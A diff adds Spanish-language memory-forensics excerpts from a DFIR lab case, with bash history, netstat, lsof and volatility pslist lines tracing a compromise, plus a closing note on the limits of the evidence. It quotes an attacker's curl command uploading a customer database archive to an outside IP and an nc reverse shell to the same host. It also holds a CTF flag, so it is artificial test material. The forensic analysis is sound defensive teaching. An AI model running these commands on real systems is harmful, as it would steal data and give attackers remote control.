@@ -1,0 +1,23 @@
+R4 — extractos de artefactos de memoria (lectura solamente)
+Caso: labs/lab11-forensia/caso/
+
+=== memoria/bash_history.txt ===
+8: tar czf /tmp/.exfil/clientes.tar.gz /app/priv/clientes.db.txt
+9: curl -s -F "f=@/tmp/.exfil/clientes.tar.gz" http://45.13.37.7/upload?tag=FLAG{dfir_c2_exfil}
+
+=== memoria/netstat.txt ===
+4: tcp   10.0.0.5:41022        45.13.37.7:4444     ESTABLISHED  1490  nc        <- C2 saliente
+
+=== memoria/lsof.txt ===
+3: 1490  nc            3u    IPv4   10.0.0.5:41022->45.13.37.7:4444
+5: 1240  bash          1w    REG    /tmp/.exfil/clientes.tar.gz
+
+=== memoria/pslist.txt ===
+1: # volatility3 linux.pslist  (extracto)   captura: 2026-09-05 02:30 UTC
+7: 1240  1201  www-data  bash            <- shell interactiva del atacante
+8: 1477  1240  root      system-check    <- SUID root (escalada); euid=0
+9: 1490  1477  root      nc 45.13.37.7 4444   <- reverse shell / C2
+
+Límite: el historial no contiene timestamps por comando. La captura de pslist es de
+02:30 UTC; netstat confirma una conexión observada en la captura. Estos extractos
+no demuestran una respuesta HTTP exitosa ni que el canal nc transportara el archivo.
